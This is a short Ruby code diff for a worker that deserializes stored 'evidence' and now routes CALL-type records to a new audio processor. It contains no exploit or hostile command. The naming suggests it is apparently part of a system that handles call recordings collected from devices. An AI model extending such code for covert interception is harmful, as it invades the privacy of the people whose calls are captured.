@@ -7,7 +7,8 @@ require 'rcs-common/trace'
 require 'rcs-common/evidence'
 require 'rcs-common/evidence_manager'
 
-# from RCS::
+# from RCS::Audio
+require 'rcs-worker/audio_processor'
 
 # form System
 require 'digest/md5'
@@ -28,7 +29,9 @@ class Worker
     
     # type of evidences to be processed
     @type = type
-    
+
+    @audio_processor = AudioProcessor.new
+
     trace :info, "Working on evidence stored in #{@instance}, type #{@type.to_s}."
     
   end
@@ -59,17 +62,17 @@ class Worker
         evidence = RCS::Evidence.new(evidence_key).deserialize(binary)
         case evidence.info[:type]
           when :CALL
-            puts "CALL EVIDENCE!"
+            @audio_processor.feed(evidence)
           else
             puts "JUNK EVIDENCE :("
-        end
+          end
       rescue Exception => e
         trace :fatal, "FAILURE: " << e.to_s
         trace :fatal, "EXCEPTION: " + e.backtrace.join("\n")
       end
-        
-      # trace :info, "Evidence from device #{evidence.info[:device_id]}, user #{evidence.info[:user_id]}."
     end
+    
+    puts @audio_processor.to_s
     
     trace :info, "All evidence has been processed."
   end
